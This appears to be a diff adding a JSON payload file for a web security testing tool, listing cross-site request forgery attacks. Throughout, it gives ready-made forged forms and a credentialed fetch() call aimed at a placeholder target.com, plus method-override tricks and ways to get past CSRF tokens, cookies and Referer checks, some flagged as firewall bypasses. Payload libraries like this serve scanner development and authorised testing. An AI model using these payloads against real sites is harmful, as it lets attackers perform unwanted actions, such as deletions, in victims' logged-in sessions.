@@ -1,0 +1,31 @@
+{
+  "category": "csrf",
+  "contexts": {
+    "json_type": {
+      "description": "CSRF bypasses for JSON endpoints using content-type manipulation",
+      "payloads": [
+        {"payload": "<form method=\"POST\" action=\"https://target.com/api/action\" enctype=\"text/plain\"><input name='{\"key\":\"value\",\"x\":\"' value='\"}'>", "description": "JSON body via text/plain form submission (bypasses CORS preflight)", "waf_bypass": false},
+        {"payload": "Content-Type: text/plain\r\n\r\n{\"action\":\"delete\",\"id\":1}", "description": "JSON payload with text/plain type to trigger simple request", "waf_bypass": false},
+        {"payload": "fetch('https://target.com/api/action',{method:'POST',credentials:'include',headers:{'Content-Type':'text/plain'},body:JSON.stringify({key:'value'})})", "description": "Fetch API CSRF with text/plain to avoid preflight", "waf_bypass": false}
+      ]
+    },
+    "method_override": {
+      "description": "CSRF via HTTP method override to bypass CSRF protections on non-POST methods",
+      "payloads": [
+        {"payload": "<form method=\"POST\" action=\"https://target.com/resource?_method=DELETE\"><input type=\"submit\"></form>", "description": "CSRF form using _method=DELETE override", "waf_bypass": false},
+        {"payload": "<form method=\"POST\" action=\"https://target.com/resource\"><input name=\"_method\" value=\"PUT\"><input type=\"submit\"></form>", "description": "CSRF form using hidden _method=PUT field", "waf_bypass": false}
+      ]
+    },
+    "token_bypass": {
+      "description": "CSRF token bypass techniques",
+      "payloads": [
+        {"payload": "Remove CSRF token parameter entirely from request", "description": "Test if server validates token presence or just its value", "waf_bypass": false},
+        {"payload": "Replace CSRF token with empty string: csrf_token=", "description": "Empty CSRF token to test blank value acceptance", "waf_bypass": false},
+        {"payload": "Use CSRF token from another user's session", "description": "Test if tokens are tied to user identity or just valid format", "waf_bypass": false},
+        {"payload": "Duplicate CSRF cookie: set csrf=attacker_value cookie and send csrf=attacker_value in body", "description": "Double-submit cookie bypass with attacker-controlled value", "waf_bypass": false},
+        {"payload": "Use Referer: https://target.com.attacker.com to bypass Referer-based CSRF protection", "description": "Referer header spoofing to bypass referer-only CSRF defenses", "waf_bypass": true},
+        {"payload": "Omit Referer header entirely (Referrer-Policy: no-referrer in attacker page)", "description": "No Referer header may bypass Referer-only validation", "waf_bypass": true}
+      ]
+    }
+  }
+}
